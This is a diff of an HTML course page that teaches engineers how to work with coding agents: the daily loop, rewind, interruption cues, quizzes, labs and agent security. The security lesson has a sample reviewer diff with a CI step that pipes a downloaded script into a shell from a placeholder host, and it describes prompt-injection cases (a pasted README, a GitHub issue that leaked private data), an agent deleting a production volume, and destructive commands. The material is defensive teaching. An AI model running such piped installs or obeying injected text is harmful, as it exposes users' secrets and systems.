@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<meta name="ainative-source" content="d00b7fa5ceef7130">
+<meta name="ainative-source" content="624726f8cd3ab7ed">
 <meta name="description" content="A Practical Guide to Becoming an AI-Native Engineer — a free, bilingual course for engineers who code: how coding agents work, context engineering, spec-driven development, the daily loop, verifying AI-written code, debugging, legacy code, security, hooks, skills and subagents, parallel agents, team playbooks and staying sharp, with graded offline labs, a quiz in every lesson and a 60-question practice exam.">
 <title>A Practical Guide to Becoming an AI-Native Engineer</title>
 <style>
@@ -4226,8 +4226,8 @@ Would I delegate it again?
 </ul>
 </section>
 <section class="sec sec-why"><h2>🧭 Why it matters</h2>
-<p>On a Friday (a constructed day) Lujain (graduate engineer) gives her agent REMIT-269, a <code>--since</code> option for <code>history</code>, in one prompt and goes into a meeting. When she returns, 14 files and 612 lines have changed: the option, a parser refactor, a tidy-up of <code>fees.py</code> and three edited tests. All pass; she commits it as <code>wip</code>. Nada (quality engineering lead) asks which of the 612 lines the feature needs; Lujain cannot say, and one edited test used to guard a fee-tier boundary. The pull request is split into four, and unpicking <code>fees.py</code> takes longer than the feature did.</p>
-<p>Nothing the agent did was exotic. The loop was missing: no plan to hold the diff against, no check between steps, no commit to return to. DORA&#39;s 2024 report associated higher AI adoption with lower delivery stability, and its authors link part of that dip to larger batch sizes; these are survey associations, not proof of cause.</p>
+<p>On a Friday (a constructed day) Lujain (graduate engineer) gives her agent REMIT-269, a <code>--since</code> option for <code>history</code>, in one prompt and goes into a meeting. When she returns, 14 files and 612 lines have changed: the option, a parser refactor, a tidy-up of <code>fees.py</code> and three edited tests. All pass; she commits it as <code>wip</code>. Nada (quality engineering lead) asks which lines the feature needs; Lujain cannot say, and one edited test used to guard a fee-tier boundary. The pull request is split into four, and unpicking <code>fees.py</code> takes longer than the feature did.</p>
+<p>The loop was missing: no plan to hold the diff against, no check between steps, no commit to return to. DORA&#39;s 2024 report associated higher AI adoption with lower delivery stability, and its authors link part of that dip to larger batch sizes; these are survey associations, not proof of cause.</p>
 </section>
 <section class="sec sec-how"><h2>📐 How it works</h2>
 <h3>🟢 The essentials</h3>
@@ -4287,19 +4287,19 @@ git commit -m &quot;feat(cli): filter history with --since&quot;
 <ul>
 <li><strong>A branch per task and a clean tree</strong> make every line of <code>git diff</code> the agent&#39;s. <strong>A green baseline</strong> makes a later red test news.</li>
 <li><strong>Commits are save points</strong>, made when a step is green. <code>git restore &lt;file&gt;</code> drops uncommitted edits to one file; <code>git revert &lt;sha&gt;</code> undoes a commit without rewriting history.</li>
-<li><strong>Conventional Commits.</strong> Remit&#39;s <code>CONTRIBUTING.md</code> asks for <code>type(scope): subject</code>: a listed type, a required lower-case scope, an imperative subject without a full stop, a header up to 72 characters. The public specification makes the scope optional; Remit is stricter.</li>
+<li><strong>Conventional Commits.</strong> Remit&#39;s <code>CONTRIBUTING.md</code> asks for <code>type(scope): subject</code>: a listed type, a required lower-case scope (optional in the public specification), an imperative subject without a full stop, a header up to 72 characters.</li>
 </ul>
-<p><strong>Plan mode, and when to skip it.</strong> In plan mode the agent explores and proposes but does not edit source files. Use it for work that spans files or code you do not yet understand; skip it for the one-sentence diff.</p>
+<p><strong>Plan mode, and when to skip it.</strong> In plan mode the agent explores and proposes but does not edit source files. Use it for multi-file work or unfamiliar code; skip it for the one-sentence diff.</p>
 <h3>🟡 Going deeper</h3>
-<p><strong>Checkpoints and rewind.</strong> At the time of writing (2026), Claude Code records a checkpoint for each prompt that starts a turn, keeps the 100 most recent and expires them about 30 days after the session&#39;s last snapshot. Open the menu with <code>Esc</code> <code>Esc</code> on an empty prompt, or <code>/rewind</code>: restore code, conversation or both, or summarise. Not restored: a file changed only by Bash (<code>rm</code>, <code>mv</code>, <code>cp</code>), edits made outside Claude Code or by other sessions, and usually a subagent&#39;s edits. The documentation says checkpoints do not replace git.</p>
-<p><strong>Cues that an agent is going astray.</strong> The card in the 🏛️ section lists six. Stop at the first.</p>
+<p><strong>Checkpoints and rewind.</strong> At the time of writing (2026), Claude Code records a checkpoint for each prompt that starts a turn, keeps the 100 most recent and expires them about 30 days after the session&#39;s last snapshot. Open the menu with <code>Esc</code> <code>Esc</code> on an empty prompt, or <code>/rewind</code>: restore code, conversation or both, or summarise. Not restored: a file changed only by Bash (<code>rm</code>, <code>mv</code>, <code>cp</code>), edits made outside Claude Code or by other sessions, and usually a subagent&#39;s edits.</p>
+<p><strong>Cues that an agent is going astray.</strong> The card in the 🏛️ section lists six.</p>
 <p>Anthropic, the maker of Claude Code, found that five assistants consistently showed sycophancy, a pull towards the user&#39;s view, across four text-generation tasks (Sharma and others, ICLR 2024). &quot;You&#39;re right&quot; is not evidence; a test run is (habit 4, <em>Trust evidence, not fluency</em>).</p>
-<p><strong>The intervention ladder</strong> is on the card; use the lowest rung that works. <code>Esc</code> stops the agent in the terminal (check the documentation for your interface); rewinding is <code>/rewind</code>, <code>git restore</code> or a commit. A correction needs a place, a reason and a check. Weak: <em>&quot;That is wrong, try again.&quot;</em> It adds no information, so you get the same attempt reworded. Strong: <em>&quot;<code>history</code> parses <code>since</code> as a naive <code>datetime</code>, which the store rejects. Build it with <code>QATAR_TZ</code> from <code>remit.limits</code>, then run <code>pytest -q tests/test_config_cli.py</code>.&quot;</em></p>
+<p><strong>The intervention ladder</strong> is on the card; use the lowest rung that works. <code>Esc</code> stops the agent in the terminal (check the documentation for your interface); rewinding is <code>/rewind</code>, <code>git restore</code> or a commit. A correction needs a place, a reason and a check. Weak: <em>&quot;That is wrong, try again.&quot;</em> adds no information, so you get the same attempt reworded. Strong: <em>&quot;<code>history</code> parses <code>since</code> as a naive <code>datetime</code>, which the store rejects. Build it with <code>QATAR_TZ</code> from <code>remit.limits</code>, then run <code>pytest -q tests/test_config_cli.py</code>.&quot;</em></p>
 <p><strong>The two-failure rule.</strong> After two failed attempts at a step, a third in the same context rarely helps: it now holds two wrong approaches, and the best-practices page lists &quot;Correcting over and over&quot; among its failure patterns. Change one thing: make the task <strong>smaller</strong>, start a <strong>fresh context</strong> (<code>/clear</code>, then one sentence on what you learned) or write a <strong>better spec</strong> with the missing fact, an example or the failing test. This is the course&#39;s rule of thumb, not a documented limit.</p>
 <p><strong>When to take the wheel.</strong> Take it when typing the fix is faster than explaining it; when the cause is a fact only you hold (the Qatar midnight, a business rule) or the agent cannot see what you see (a screen); when you cannot yet verify a money-path change; when two attempts failed; or when you are practising a skill you want to keep (lesson <a class="xref" href="#/13.1">13.1</a>). It is not failure: fix the hard line, then hand the keyboard back for the tests.</p>
 <p><strong>Session hygiene.</strong> One task per session; the page calls the opposite &quot;The kitchen sink session&quot;. Use <code>/clear</code> between tasks, <code>/compact Focus on the CLI changes</code> when a long task fills the window and <code>/context</code> to see what is loaded; send investigations to subagents, which return a report only.</p>
-<p><strong>The agent log.</strong> After each AI-assisted task, note the prompt, the result, your corrections, your checks and the minutes. Be honest about the minutes: the log is your clock, and your feeling of speed is not.</p>
-<p><strong>A session timeline with the interventions marked.</strong> Constructed for REMIT-269; not recorded from a real model, and the times are invented.</p>
+<p><strong>The agent log.</strong> After each AI-assisted task, note the prompt, result, corrections, checks and minutes. Be honest about the minutes: the log is your clock, not your feeling of speed.</p>
+<p><strong>A session timeline, interventions marked.</strong> Constructed for REMIT-269, with invented times; not recorded from a real model.</p>
 <div class="table-scroll"><table>
 <thead>
 <tr>
@@ -4354,10 +4354,10 @@ git commit -m &quot;feat(cli): filter history with --since&quot;
 </tr>
 </tbody></table></div>
 <h3>🔴 Expert view</h3>
-<p><strong>Done means verified.</strong> Meta&#39;s engineering blog describes a small team building its Forum app with an AI agent as a participant. Meta reports that it measured success by production-ready changes, not code volume, and set the bar &quot;at verification rather than compilation&quot;: a task is complete only after automated tests and visual checks pass, not when the code compiles. It also reports that when the agent repeated a mistake more than twice, the team encoded the correction once, for everyone. All of it is a company&#39;s account of its own practice, not independent evidence. The habits carry over: &quot;done&quot; is a check you ran, and a correction you make a third time belongs in <code>CLAUDE.md</code>, a test or a hook (Modules 2 and 9).</p>
+<p><strong>Done means verified.</strong> Meta&#39;s engineering blog describes a small team building its Forum app with an AI agent as a participant. It reports measuring success by production-ready changes, not code volume, with the bar &quot;at verification rather than compilation&quot;: a task is complete only after automated tests and visual checks pass. When the agent repeated a mistake more than twice, the team encoded the correction once, for everyone. This is a company&#39;s account of its own practice, not independent evidence. For us, &quot;done&quot; is a check you ran, and a correction you make a third time belongs in <code>CLAUDE.md</code>, a test or a hook (Modules 2 and 9).</p>
 <p><strong>Gate the stop.</strong> An agent stops when it believes it is done. The page names three ways to make &quot;done&quot; require your check: a <code>/goal</code> condition, a Stop hook or a verification subagent (lesson <a class="xref" href="#/9.1">9.1</a> covers hooks and subagents, not <code>/goal</code>; check the current documentation).</p>
-<p><strong>How long a leash.</strong> The course&#39;s default is Manual or <code>acceptEdits</code> mode with a check after every step; the mode Claude Code starts in depends on its version, plan and provider, so read the status bar. Longer leashes (auto mode, background and headless runs) pay when the work is specified, checkable and cheap to throw away, but you lose the cues, since you cannot interrupt what you are not watching: automate the checks. The documentation says auto mode &quot;does not guarantee safety&quot;.</p>
-<p><strong>When not to run the full loop.</strong> For a one-sentence diff, read the diff and commit. For a throwaway spike, delete the branch afterwards. The loop cannot rescue a vague ticket: if every lap ends in &quot;not what I meant&quot;, return to lesson <a class="xref" href="#/3.1">3.1</a>.</p>
+<p><strong>How long a leash.</strong> The course&#39;s default is Manual or <code>acceptEdits</code> mode with a check after every step; the mode Claude Code starts in depends on its version, plan and provider, so read the status bar. Longer leashes (auto mode, background and headless runs) pay when the work is specified, checkable and cheap to throw away, but unwatched, you lose the cues: automate the checks. The documentation says auto mode &quot;does not guarantee safety&quot;.</p>
+<p><strong>When not to run the full loop.</strong> For a throwaway spike, delete the branch afterwards. The loop cannot rescue a vague ticket: if every lap ends in &quot;not what I meant&quot;, return to lesson <a class="xref" href="#/3.1">3.1</a>.</p>
 </section>
 <section class="sec sec-repos"><h2>🧰 The toolkit</h2>
 <div class="table-scroll"><table>
@@ -4432,7 +4432,7 @@ After the last step
 - [ ] Money logic has a second human reviewer. Agent log entry, with minutes.
 - [ ] A correction I made a third time is now a rule, a test or a hook.
 </code></pre>
-<p>The second is the <strong>Interruption cues</strong> card. Keep it next to the terminal.</p>
+<p>The second, the <strong>Interruption cues</strong> card, lives next to the terminal.</p>
 <pre><code class="language-text">INTERRUPTION CUES - stop at the first one
 1 Thrashing         the same lines edited back and forth; a test flipping red and green
 2 Out of scope      a file you did not name; a test edited; &quot;while I&#39;m here&quot; tidying
@@ -4493,7 +4493,7 @@ LADDER  1 stop (Esc) and say what you saw    2 correct once: file, line, reason
 </ul>
 <details><summary>Answer</summary>
 
-<p><strong>D.</strong> After two failures a third try in the same context rarely helps; change the task, the context or the spec. A longer correction in the same context adds words, not new information; rewinding the whole day throws away good work. (🟡 The two-failure rule.)</p>
+<p><strong>D.</strong> A third try in the same context rarely helps; change the task, the context or the spec. A longer correction adds words, not new information; rewinding the whole day throws away good work. (🟡 The two-failure rule.)</p>
 </details>
 
 <p><strong>3. Lujain says <code>Esc</code> <code>Esc</code> makes commits unnecessary, because she can rewind anything. What is the right reply?</strong></p>
@@ -4505,7 +4505,7 @@ LADDER  1 stop (Esc) and say what you saw    2 correct once: file, line, reason
 </ul>
 <details><summary>Answer</summary>
 
-<p><strong>A.</strong> Bash changes and outside edits are untracked, snapshots expire, and git is the real save point. B is the tempting myth; D is wrong because rewind can restore code too. (🟡 Checkpoints and rewind.)</p>
+<p><strong>A.</strong> Bash changes and outside edits are untracked, snapshots expire, and git is the real save point. B is the tempting myth; D is wrong: rewind can restore code too. (🟡 Checkpoints and rewind.)</p>
 </details>
 
 <p><strong>4. Hessa (product owner) files a ticket to fix one misspelt word in an English message. Which approach fits?</strong></p>
@@ -4616,7 +4616,7 @@ LADDER  1 stop (Esc) and say what you saw    2 correct once: file, line, reason
             self.notifier.notify(customer, &quot;limit_warning&quot;, percent=round(ratio * 100),
                                  remaining=limits.daily_limit - limits.daily_used)
 </code></pre>
-<p>(1) <code>limits.daily_used</code> is the position <strong>before</strong> this transfer, so the warning comes one transfer late. (2) A <code>Decimal</code> compared with a float is compared exactly, and <code>Decimal(&quot;0.8&quot;) &gt;= 0.8</code> is <code>False</code>: exactly 80% gets no warning. (3) <code>round</code> rounds the percentage instead of rounding it down. (4) The notifier is called directly, so a delivery failure escapes <code>send</code> after the transfer was saved. (5) An <code>int</code> percentage is not localised, so Arabic customers see Western digits. Evidence beats reading: defect 2 takes ten seconds to check. Look for these five in any agent diff.</p>
+<p>(1) <code>limits.daily_used</code> is the position <strong>before</strong> this transfer, so the warning comes one transfer late. (2) A <code>Decimal</code> compared with a float is compared exactly, and <code>Decimal(&quot;0.8&quot;) &gt;= 0.8</code> is <code>False</code>: exactly 80% gets no warning. (3) <code>round</code> rounds the percentage instead of rounding it down. (4) The notifier is called directly, so a delivery failure escapes <code>send</code> after the transfer was saved. (5) An <code>int</code> percentage is not localised, so Arabic customers see Western digits. Evidence beats reading: defect 2 takes ten seconds to check.</p>
 <pre><code class="language-text">&gt;&gt;&gt; from decimal import Decimal
 &gt;&gt;&gt; Decimal(&quot;1600.00&quot;) / Decimal(&quot;2000.00&quot;) &gt;= 0.8
 False
@@ -4739,7 +4739,7 @@ git switch -c remit-318-limit-warning
 pytest -q
 </code></pre>
 <p>The starter is green: 99 tests pass. It holds <code>CLAUDE.md</code> (the project memory from lab 2.2), <code>specs/TEMPLATE.md</code>, an unfilled <code>agent-log.md</code> and <code>TASK.md</code>, committed as &quot;Lab starting state&quot; and tagged <code>lab-start</code>; steps 6 and 7 and the grader compare with that tag. The grader reads the branch checked out in <code>~/ainative/m04</code>, so grade on your task branch. If your tool reads <code>AGENTS.md</code>, copy or link the memory file.</p>
-<p><strong>Your move.</strong> Follow the seven steps. Explore first (plan mode, in Claude Code) and record in the spec what the ticket leaves open. Commit the spec. With an agent, give it one step per prompt, as in the specified prompt above; the memory file lets it commit only when asked, so ask, or commit yourself. Then one step per lap: failing test, code, <code>pytest -q</code> yourself, <code>git diff</code>, commit as <code>type(scope): subject</code>. Stop at the first cue on the card.</p>
+<p><strong>Your move.</strong> Follow the seven steps. Explore first (plan mode, in Claude Code), then write and commit the spec. With an agent, give it one step per prompt, as in the specified prompt above. Then one step per lap: failing test, code, <code>pytest -q</code> yourself, <code>git diff</code>, commit as <code>type(scope): subject</code>. Stop at the first cue on the card.</p>
 <p>Step 6 is the one people skip. In <code>~/ainative/m04</code>, after committing, run <code>git restore --source=lab-start --staged --worktree src</code> to put the code back, then run your new tests. Those that expect a warning must fail; &quot;no warning at 79.99%&quot; or &quot;nothing sent on a refusal&quot; tests stay green, as they should. Then <code>git restore --source=HEAD --staged --worktree src</code> brings your feature back.</p>
 <p><strong>What the grader checks.</strong> Required: the suite passes; no old test, fixture or constant was edited; the hidden acceptance tests (the rules, wording and interface of the ticket, in both languages and all three KYC tiers); your new tests pass the two checks above; only the files <code>TASK.md</code> lists changed, with at most four files and 120 changed lines under <code>src/</code>; no float added; three or more commits with Remit messages; nothing uncommitted; no secrets. Advisory: a spec and plan, spec before code, every commit green, no commit adding over 200 lines, no blanket <code>except</code>, a log entry.</p>
 <p><strong>Grade.</strong></p>
@@ -6864,7 +6864,7 @@ Time spent:      (you / the agent)
 </ul>
 </section>
 <section class="sec sec-why"><h2>🧭 Why it matters</h2>
-<p>Week zero said the agent has your hands. This week asks what happens when it uses them badly, by its own mistake or because text it read told it to. Noura (application and AI security) asks: can you write down the worst it could do in this session, and what stops it?</p>
+<p>This week asks what happens when the agent misuses your hands. Noura (application and AI security) asks: can you write down the worst it could do in this session, and what stops it?</p>
 <p>At Najm the bad day is smaller. Suppose Lujain (graduate engineer) pastes a vendor README into a session running in bypass mode, with a <code>.env</code> in the folder and <code>curl</code> allowed. The README does not need to be clever; it only needs to be read.</p>
 <p>One public account (hold the details loosely) shows a bigger shape. In April 2026 the founder of PocketOS said a Cursor coding agent found an over-scoped API token and deleted a production volume in one call; his backups were on the same volume. His hosting provider later said the data was recovered (<a href="https://decrypt.co/365897/ai-agent-deletes-startup-database-9-seconds-founder-says">Decrypt</a>).</p>
 </section>
@@ -6919,7 +6919,7 @@ Time spent:      (you / the agent)
 </tr>
 <tr>
 <td>GitHub issue</td>
-<td>Invariant Labs (May 2025): in a demonstration, a public issue steered an agent using the GitHub MCP server into leaking private-repository data</td>
+<td>Invariant Labs (May 2025): a public issue steered an agent using the GitHub MCP server into leaking private-repository data</td>
 </tr>
 <tr>
 <td>MCP tool description</td>
@@ -6959,7 +6959,7 @@ Time spent:      (you / the agent)
 <p><strong>Excessive agency</strong> (OWASP LLM06:2025; LLM03 in the 2026 edition) has three roots: unneeded tools, a token broader than the task, irreversible actions with no human. The Cursor report above shows the last two.</p>
 <h3>🟡 Going deeper</h3>
 <p><strong>Secrets leak sideways:</strong> into <code>.env</code> files, shell history, logs, fixtures, commits, prompts and transcripts (Claude Code keeps local ones as plain text under <code>~/.claude/projects/</code>, 30 days by default). Keep settings in environment variables, <code>.env</code> out of git and the agent&#39;s reach, and a secret scanner in pre-commit and CI. When one escapes, <strong>rotate first</strong>: rewriting history does not un-leak the key.</p>
-<p><strong>Destructive commands.</strong> <code>git reset --hard</code> discards uncommitted changes (committed work returns from the reflog); <code>git clean -fd</code> deletes untracked files git never had; <code>rm -rf</code> removes the tree; a broad API token destroys whatever it touches in seconds. The commit is the undo: commit before the agent runs, one branch per task (<code>/rewind</code> does not track shell changes such as <code>rm</code>). Keep backups and production credentials out of the agent&#39;s reach.</p>
+<p><strong>Destructive commands.</strong> <code>git reset --hard</code> discards uncommitted changes (committed work returns from the reflog); <code>git clean -fd</code> deletes untracked files git never had; <code>rm -rf</code> removes the tree; a broad API token destroys whatever it touches in seconds. The commit is the undo: commit before the agent runs, one branch per task (<code>/rewind</code> does not track shell changes such as <code>rm</code>). Keep backups out of the agent&#39;s reach.</p>
 <p><strong>Hallucinated packages.</strong> Spracklen et al. (USENIX Security 2025) tested 16 code-generating models on 576,000 samples and found average hallucinated-package rates of at least 5.2 percent for commercial and 21.7 percent for open-source models: a lab measurement of invented names, not installs. <em>Slopsquatting</em> is registering a malicious package under such a name, so a name that resolves may be a day old.</p>
 <p>Hygiene, cheapest first: a <strong>person</strong> adds dependencies (CONTRIBUTING.md: a ticket and a second reviewer); an <strong>allow-list</strong> names what may be used; a <strong>lockfile</strong> pins versions and hashes, so you install what you reviewed; <strong>CI</strong> fails on the rest (lesson <a class="xref" href="#/8.2">8.2</a>). Read this diff as a reviewer:</p>
 <pre><code class="language-diff">--- a/pyproject.toml
@@ -6972,7 +6972,7 @@ Time spent:      (you / the agent)
 +      - name: Set up the statement tools
 +        run: curl -s https://get.csvtidy.example.invalid/setup.sh | sh
 </code></pre>
-<p>Three findings: two unapproved packages from an address nobody vetted, and no lockfile; a download piped into a shell inside CI, which holds secrets; no sign of a ticket or reviewer. <code>packages.invalid</code> never resolves; a real address would. Neither is on the allow-list.</p>
+<p>Three findings: two unapproved packages from an address nobody vetted, and no lockfile; a download piped into a shell inside CI, which holds secrets; no sign of a ticket or reviewer. <code>packages.invalid</code> never resolves; a real address would.</p>
 <p><strong>Insecure generated code.</strong> Pearce et al. found about 40 percent of 1,689 Copilot programs vulnerable (a 2021-era tool); Perry et al. (CCS 2023), in one user study of an early assistant, found users wrote significantly less secure code yet were more likely to believe it secure. Results depend on task, tool and date: a reason to review, not a rate. Remit has a planted example, <code>Store.search_by_name</code>; find it with the security pass of lesson <a class="xref" href="#/5.1">5.1</a>.</p>
 <p><strong>Licence, IP and data.</strong> Ask what licence a new dependency carries, whether you pasted code you may not share, and who owns the output (policy decides; not legal advice, see <a href="../aigp/index.html#/5.2"><em>AI Governance</em>, lesson 5.2 — Intellectual property in AI inputs and outputs</a>).</p>
 <p><strong>Prompt for the safe path.</strong></p>
@@ -7022,7 +7022,7 @@ $ git reflog -2                    # hashes here are illustrative
 ca25143 HEAD@{1}: commit: feat(fees): cap
 $ git branch rescue &#39;HEAD@{1}&#39;     # a branch at the lost commit; it deletes nothing
 </code></pre>
-<p>The reflog is local and expires, and files <code>git clean</code> removed were never in git.</p>
+<p>The reflog is local and expires.</p>
 </section>
 <section class="sec sec-repos"><h2>🧰 The toolkit</h2>
 <div class="table-scroll"><table>
@@ -7066,7 +7066,7 @@ $ git branch rescue &#39;HEAD@{1}&#39;     # a branch at the lost commit; it del
 </tbody></table></div>
 </section>
 <section class="sec sec-wild"><h2>🏛️ In practice at Najm Bank</h2>
-<p>Noura&#39;s rule: no new kind of agent session without a worksheet, no repository without the checklist. Both live in <code>docs/</code>.</p>
+<p>Noura&#39;s rule: no new kind of agent session without a worksheet, no repository without the checklist.</p>
 <p><strong>The Agent threat-model worksheet.</strong> Save it as <code>docs/agent-threat-model.md</code>.</p>
 <pre><code class="language-markdown"># Agent threat-model worksheet
 
@@ -7119,7 +7119,7 @@ $ git branch rescue &#39;HEAD@{1}&#39;     # a branch at the lost commit; it del
 <ul>
 <li>Model what the agent can read, run, reach and push, and what text can steer it.</li>
 <li>Injection has no complete fix: remove a trifecta leg, keep permissions narrow.</li>
-<li>Hooks run first, then deny, ask, allow. A Bash rule is a guard rail; the sandbox is the wall.</li>
+<li>Hooks run first, then deny, ask, allow.</li>
 <li>People add dependencies; money logic needs a second human.</li>
 <li>After a mishap: stop, contain, rotate, recover, tell.</li>
 </ul>
@@ -7355,7 +7355,7 @@ FAILED: 3 package(s) to look at before this merges
 </tbody></table></div>
 </section>
 <section class="sec sec-wild"><h2>🏛️ In practice at Najm Bank</h2>
-<p><strong>Needs an agent: no.</strong> An editor, <code>git</code>, <code>pytest</code> and the sample files are enough; an agent can help with parts 1 to 3, and the grader does not care how the work was produced.</p>
+<p><strong>Needs an agent: no.</strong> An editor, <code>git</code>, <code>pytest</code> and the sample files are enough.</p>
 <p><strong>The ticket.</strong> This is <code>TASK.md</code>, as Noura wrote it:</p>
 <pre><code class="language-text"># REMIT-258: harden how agents work in this repository
 
